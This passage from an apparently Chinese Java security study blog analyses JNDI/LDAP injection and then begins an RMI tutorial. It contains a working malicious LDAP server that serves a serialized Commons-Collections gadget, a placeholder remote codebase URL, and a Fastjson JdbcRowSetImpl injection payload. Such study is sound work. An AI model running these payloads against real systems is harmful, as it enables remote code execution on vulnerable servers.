class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.text.ParseException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://vps:8000/#ExportObject&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * */</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         * * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span> <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br>            <span class="hljs-comment">// Payload1: 利用LDAP+Reference Factory  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><br>            <span class="hljs-comment">// Payload2: 返回序列化Gadget</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (ParseException exception) &#123;<br>                exception.printStackTrace();<br>            &#125;<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// lookup参数注入触发  </span><br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);<br><br>        <span class="hljs-comment">// Fastjson反序列化JNDI注入Gadget触发</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119836.png"></p><h5 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h5><p>在这里下断点调试</p><p>首先还是经过 lookup 的方法调用</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119597.png"></p><p><strong>InitialContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119493.png"></p><p><strong>ldapURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119211.png"></p><p><strong>ldapURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119982.png"></p><p><strong>GenericURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119690.png"></p><p><strong>GenericURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119370.png"></p><p><strong>PartialCompositeContext.lookup.p_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119175.png"></p><p><strong>ComponentContext.p_lookup.c_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119759.png"></p><p><strong>LdapCtx.c_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119325.png"></p><p>从上面是通过 p_lookup.c_lookup 进入到  <strong>decodeObject</strong> 中，这里是重点要关注的，</p><p><strong>decodeObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119733.png"></p><p>进入 <strong>decodeObject</strong>，先要进入一个 getURLClassLoader ，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119691.png"></p><p>getURLClassLoader 中的 trustURLCodebase 默认是 false ,不执行 newInstance 实例化，这里虽然已经获取到字节码了，只是不实例化就无法加载，也就无法命令执行。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119731.png"></p><p>接着往下走，来到了 deserializaObject ，</p><p><strong>decodeObject.deserializaObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120786.png"></p><p>而 deserializaObject 对象中恰好有 readObject ，字节码在此处被反序列化造成漏洞。</p><p><strong>deserializaObject.readObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120465.png"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap</a></p><p><a href="http://101.36.122.13:4000/2025/03/08/JNDI%E4%B8%93%E9%A2%98/">http://101.36.122.13:4000/2025/03/08/JNDI%E4%B8%93%E9%A2%98/</a></p><p><a href="https://www.bilibili.com/video/BV1ct4y1h79t">https://www.bilibili.com/video/BV1ct4y1h79t</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2025/09/20/RMI/"/>
    <url>/2025/09/20/RMI/</url>
    
    <content type="html"><![CDATA[<h2 id="1、RMI是什么"><a href="#1、RMI是什么" class="headerlink" title="1、RMI是什么"></a>1、RMI是什么</h2><blockquote><p>Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。这样做的特点如下：</p><p>优点：避免重复造轮子；</p><p>缺点：调用过程很慢，而且该过程是不可靠的，容易发生不可预料的错误，比如网络错误等；</p><p>在RMI中的核心是远程对象（remote object），除了对象本身所在的虚拟机，其他虚拟机也可以调用此对象的方法，而且这些虚拟机可以不在同一个主机上。每个远程对象都要实现一个或者多个远程接口来标识自己，声明了可以被外部系统或者应用调用的方法（当然也有一些方法是不想让人访问的）。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png"></p><h2 id="2、RMI-基本实现"><a href="#2、RMI-基本实现" class="headerlink" title="2、RMI 基本实现"></a>2、RMI 基本实现</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException, NotBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMI 客户端通过远程调用服务端的 sayHello 方法，成功在服务端输出了大写的“HELLO”。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png"></p><h2 id="3、流程原理"><a href="#3、流程原理" class="headerlink" title="3、流程原理"></a>3、流程原理</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png"></p><h3 id="3-1-服务端-创建远程服务"><a href="#3-1-服务端-创建远程服务" class="headerlink" title="3.1 服务端-创建远程服务"></a>3.1 服务端-创建远程服务</h3><p>调试分析远程对象的创建过程：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png"></p><p>进入其构造函数，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png"></p><p>**UnicastRemoteObject **中 ，port 被默认赋值为 0</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png"></p><p>步入  UnicastRemoteObject  类中的 <strong>exportObject</strong> （姑且称为导出对象函数）</p><ul><li><font style="color:#080808;background-color:#ffffff;">public static</font>：不需要创建 UnicastRemoteObject  实例也可以调用<ul><li><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png"></li></ul></li><li>Remote obj：实现了 java.rmi.Remote 接口的对象，</li><li>int port： 接收客户端的请求</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png"></p><p>接下进入 return exportObject(obj, new UnicastServerRef(port)); 中的  <font style="color:#080808;background-color:#ffffff;">new UnicastServerRef(port))，</font><strong><font style="color:#080808;background-color:#ffffff;">UnicastServerRef</font></strong><font style="color:#080808;background-color:#ffffff;">（称之为服务端引用）</font></p><p><font style="color:#080808;background-color:#ffffff;">var 1 这里是端口号 port ，传入 port 后，调用 父类构造函数 </font><strong><font style="color:#080808;background-color:#ffffff;">LiveRef</font></strong><font style="color:#080808;background-color:#ffffff;">,</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png"></p><p>来到 LiveRef 的构造函数</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png"></p><p>这里可以看一下 getLocalEndpoint</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png"></p><p>这里的 <strong>TCPEndpoint</strong> 用于远程通信，其构造函数中的变量 String var1 为 host (ip) 、int var2 为 port (端口)</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png"></p><p>继续跟入 <font style="color:#080808;background-color:#ffffff;">this(var1, TCPEndpoint.getLocalEndpoint(var2), true); 中的 </font>this，在此处 ep 中有了IP和端口信息</p><ul><li>Endpoint ep    端点信息（IP、端口、socket）</li><li>Channel ch     通信通道（缓存的连接）</li><li>isLoacl    是否为本地对象</li></ul><p>然后这些信息都被存放在 LiveRef 中。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png"></p><p>接下来又调用了父类方法并将 ref 赋值为 var1（var1:<strong>LiveRef@626</strong>）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png"></p><p>接下来回到  <font style="color:#080808;background-color:#ffffff;">return exportObject(obj, new UnicastServerRef(port)); 中的  exportObject 方法</font></p><p><font style="color:#080808;background-color:#ffffff;">首先判断了 obj 是否继承了 UnicastRemoteObject ，如果没有继承那么就把 ref 设置为 sref。</font></p><p><font style="color:#080808;background-color:#ffffff;">之后都使用 sref.exportObject 进行工作完成导出远程对象的操作</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png"></p><p>而 sref 中封装着 LiveRef@626</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png"></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><p><strong><font style="color:#080808;background-color:#ffffff;">sref.exportObject </font></strong> 的执行过程：</p><p><code>stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</code>这一步是创建<strong>客户端代理</strong>的过程。</p><blockquote><p>（为什么要在服务端创建客户端代理呢？）</p><p>这里通过流程图解释：服务端首先创建好 Remote Stub 放到注册中心，客户端通过注册中心拿到 Remote Stub，客户端通过 Remote Stub 调用另一个代理 Remote Skeleton ，之后 Remote Skeleton 调用服务端。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png"></p></blockquote><p>步入 createProxy</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png"></p><p>clientRef 中存放的就是那个核心 LiveRef@783 （上文是 LiveRef@626，核心都是相同的）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png"></p><p>此处进行了判断：</p><ul><li>forceStubUse：如果为 <code>true</code>，就强制使用旧的 <strong>静态 Stub 类</strong>（由 <code>rmic</code> 工具生成的 <code>_Stub.class</code>）这是为了兼容 JDK 1.1 时代的 RMI，这种情况直接调用 <code>createStub(...)</code> 去加载和实例化 Stub</li><li>ignoreStubClasses：如果为 <code>true</code>，表示忽略静态 Stub 类。这时会尝试用 <strong>动态代理</strong>（<code>java.lang.reflect.Proxy</code>）来生成 Stub</li><li>stubClassExists：</li></ul><figure 